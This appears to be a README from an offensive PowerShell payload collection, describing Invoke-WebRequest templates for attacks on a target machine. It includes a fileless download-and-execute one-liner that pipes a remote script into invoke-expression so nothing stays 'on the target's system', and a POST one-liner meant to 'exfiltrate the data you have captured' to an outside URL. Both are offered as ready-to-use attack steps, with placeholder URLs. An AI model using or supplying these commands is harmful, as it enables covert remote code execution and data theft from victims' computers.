## Description

These functions are used to either download or upload files or data

## The Function

### [IWR-Save] 

This formatting of the IWR function will download a file from a selected URL and save it to the directory of your choosing 

This is helpful if you are trying to save an image or sound file to use in your script

------------------------------------------------------------------------------------------------------------------------------

`$env:TMP\`

Use this environment variable to save the file to your Temp directory

`$Env:USERPROFILE\Desktop\`

Use this environment variable to save a file to your desktop

```PowerShell
iwr < Your url for the intended file>?dl=1 -O $Env:USERPROFILE\Desktop\image.jpg
```

### [IWR-Fileless] 

This formatting of the IWR function will download a file and execute it immedietely without saving it to memory

This is helpful if you are trying to download and execute a script without keeping it on the target's system

```PowerShell
$pl = iwr < Your url for the intended file>?dl=1; invoke-expression $pl
```

### [IWR-Post] 

This formatting of the IWR function will exfiltrate data via a DNS/POST

This is helpful if you are trying to exfiltrate the data you have captured

[Request Catcher](https://requestcatcher.com/)<-------Helpful website to test POST requests

```PowerShell
iwr -Uri < Your url for posting the intended data> -Method POST -Body "text to upload"
```